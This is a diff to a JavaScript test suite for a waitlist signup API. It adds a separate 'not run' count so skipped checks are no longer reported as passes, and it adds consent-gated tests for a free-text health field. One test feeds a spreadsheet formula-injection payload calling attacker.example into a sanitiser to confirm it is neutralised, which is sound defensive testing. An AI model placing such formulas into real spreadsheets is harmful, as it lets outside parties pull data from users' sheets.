@@ -106,9 +106,27 @@ function goodPayload(overrides = {}) {
 const results = [];
 let failures = 0;
 
+let skipped = 0;
+
+/**
+ * `detail.skip === true` records a THIRD outcome, not a pass.
+ *
+ * Two of these cross-checks cannot run until the Conversion branch is merged,
+ * and they used to return `pass: true` with the word SKIPPED in the message.
+ * The message was honest and the count was not: "150/150 passed" included two
+ * checks that never looked at anything. That is the same fault the merge
+ * compatibility checker had — passing because nothing was found rather than
+ * because nothing was wrong — and a summary line is exactly where nobody reads
+ * the fine print.
+ */
 async function check(name, expectation, fn) {
   try {
     const detail = await fn();
+    if (detail.skip) {
+      skipped += 1;
+      results.push({ name, expectation, actual: detail.actual, skip: true });
+      return;
+    }
     const pass = detail.pass;
     if (!pass) failures += 1;
     results.push({ name, expectation, actual: detail.actual, pass });
@@ -932,7 +950,7 @@ await check('Error response never echoes submitted input', 'no email in body', a
     try {
       src = (await import('node:fs')).readFileSync(path, 'utf8');
     } catch {
-      return { pass: true, actual: 'SKIPPED — Conversion branch not merged yet' };
+      return { skip: true, actual: 'not run — Conversion branch not merged here' };
     }
     const start = src.indexOf('  return {', src.indexOf('export function buildPayload'));
     const keys = [...src.slice(start, src.indexOf('\n  };', start)).matchAll(/^\s{4}([a-z_0-9]+):/gm)].map((m) => m[1]);
@@ -958,7 +976,7 @@ await check('Error response never echoes submitted input', 'no email in body', a
     try {
       src = (await import('node:fs')).readFileSync(path, 'utf8');
     } catch {
-      return { pass: true, actual: 'SKIPPED — Conversion branch not merged yet' };
+      return { skip: true, actual: 'not run — Conversion branch not merged here' };
     }
     // NOTE the spread: SERVER_KNOWN_KEYS is `new Set([...CORE_KEYS, "…"])`, so
     // its literals alone are not the set. Union, or you measure a third of it.
@@ -1050,12 +1068,40 @@ await check('Error response never echoes submitted input', 'no email in body', a
     });
   }
 
-  await check('motivation_other is gone — no free text beside the Art 9 question', '400', async () => {
-    // Removed 2026-08-18. A fixed list bounds what we can learn about someone's
-    // health; an open box does not, and this is the one question where that
-    // matters most. An unknown key 400s, which is the loud outcome.
-    const r = await post(growthPayload({ consent_health: true, motivation: ['other'], motivation_other: 'anything' }));
+  // Reinstated 2026-08-19. Accepted, but only inside the health gate and only
+  // paired to an actual "other" selection — the same two conditions every other
+  // free-text box in the health block has to satisfy.
+  await check('motivation_other accepted with health consent + "other" selected', '200', async () => {
+    const r = await post(growthPayload({
+      consent_health: true, motivation: ['other'], motivation_other: 'Doctor suggested it',
+    }));
+    return { pass: r.status === 200, actual: String(r.status) };
+  });
+  await check('motivation_other DROPPED without health consent', 'not stored', async () => {
+    const { validateWaitlist } = await import('../src/lib/validation.js');
+    const v = validateWaitlist({
+      email: 'a@gmail.com', consent_marketing: true,
+      consent_health: false, motivation: ['other'], motivation_other: 'something private',
+    });
+    // Validates — the drop is server-side, not a rejection — but nothing is kept.
+    const stored = v.ok && v.data.consent_health ? v.data.motivation_other : null;
+    return { pass: v.ok && stored === null, actual: `consent_health=${v.data?.consent_health}, stored=${JSON.stringify(stored)}` };
+  });
+  await check('motivation_other requires "other" actually selected', '400', async () => {
+    const r = await post(growthPayload({
+      consent_health: true, motivation: ['gut_health'], motivation_other: 'typed anyway',
+    }));
     return { pass: r.status === 400, actual: String(r.status) };
+  });
+  await check('motivation_other capped at 60, like dietary_other', '<=60 ok, >60 400', async () => {
+    const ok = await post(growthPayload({ consent_health: true, motivation: ['other'], motivation_other: 'x'.repeat(60) }));
+    const no = await post(growthPayload({ consent_health: true, motivation: ['other'], motivation_other: 'x'.repeat(61) }));
+    return { pass: ok.status === 200 && no.status === 400, actual: `60->${ok.status}, 61->${no.status}` };
+  });
+  await check('Formula payload in motivation_other neutralised', "prefixed with '", async () => {
+    const { sanitizeForSheet } = await import('../src/lib/validation.js');
+    const out = sanitizeForSheet('=IMPORTXML("https://attacker.example","//a")');
+    return { pass: out.startsWith("'"), actual: out.slice(0, 30) + '…' };
   });
 
   await check('dietary_other capped at 60, not 120', '<=60 ok, >60 400', async () => {
@@ -1105,6 +1151,19 @@ await check('Error response never echoes submitted input', 'no email in body', a
     const b = r.json ?? {};
     const ok = b.ok === true && (b.count === undefined ? b.position === undefined : b.count === b.position);
     return { pass: ok, actual: JSON.stringify(b) };
+  });
+
+  await check('Receipt block names match the field names they document', 'no mixed vocabulary', async () => {
+    // `mail` vs `postal` in one document cost two people an hour between them.
+    // Asserting the relationship rather than the literal, so a future rename
+    // that moves one and not the other fails here.
+    const src = (await import('node:fs')).readFileSync(new URL('../api/waitlist.js', import.meta.url), 'utf8');
+    const blocks = [...src.matchAll(/\['(\w+)', data\.consent_(\w+),/g)].map((m) => [m[1], m[2]]);
+    const mismatched = blocks.filter(([block, field]) => block !== field);
+    return {
+      pass: blocks.length === 4 && mismatched.length === 0,
+      actual: mismatched.length ? `block "${mismatched[0][0]}" documents consent_${mismatched[0][1]}` : `${blocks.length} blocks, all aligned`,
+    };
   });
 
   await check('Server-derived fields still rejected from the client', '400', async () => {
@@ -1169,10 +1228,16 @@ console.log('═'.repeat(112));
 console.log(`  ${pad('CASE', 54)} ${pad('EXPECTED', 26)} ${pad('ACTUAL', 22)} `);
 console.log('─'.repeat(112));
 for (const r of results) {
-  console.log(`${r.pass ? '  ✓ ' : '  ✗ '}${pad(r.name, 52)} ${pad(r.expectation, 26)} ${pad(r.actual, 22)}`);
+  const mark = r.skip ? '  · ' : r.pass ? '  ✓ ' : '  ✗ ';
+  console.log(`${mark}${pad(r.name, 52)} ${pad(r.expectation, 26)} ${pad(r.actual, 22)}`);
 }
 console.log('─'.repeat(112));
-console.log(`  ${results.length - failures}/${results.length} passed${failures ? `  —  ${failures} FAILED` : ''}`);
+const ran = results.length - skipped;
+console.log(
+  `  ${ran - failures}/${ran} passed` +
+    (failures ? `  —  ${failures} FAILED` : '') +
+    (skipped ? `  ·  ${skipped} NOT RUN (counted separately, never as passes)` : '')
+);
 console.log('═'.repeat(112) + '\n');
 
 if (fileURLToPath(import.meta.url) === process.argv[1]) {
